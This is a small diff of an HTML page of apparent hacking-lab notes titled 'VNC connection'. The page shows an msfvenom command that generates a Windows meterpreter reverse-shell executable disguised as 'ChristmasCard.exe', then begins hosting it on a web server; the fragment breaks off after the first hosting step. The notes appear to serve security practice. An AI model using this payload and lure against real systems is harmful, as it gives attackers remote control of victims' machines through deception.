@@ -2,7 +2,9 @@
 <hr/>
 <h1>VNC connection</h1>
 <h2>Create malicious file</h2>
-<p>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/myusername/Desktop/ChristmasCard.exe</p>
+<p><ol>
+  <ul>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/myusername/Desktop/ChristmasCard.exe</ul>
+</ol></p>
 <h2>Host malicious file</h2>
 <p><ol>
 <ul>mkdir /var/www/html/share</ul>
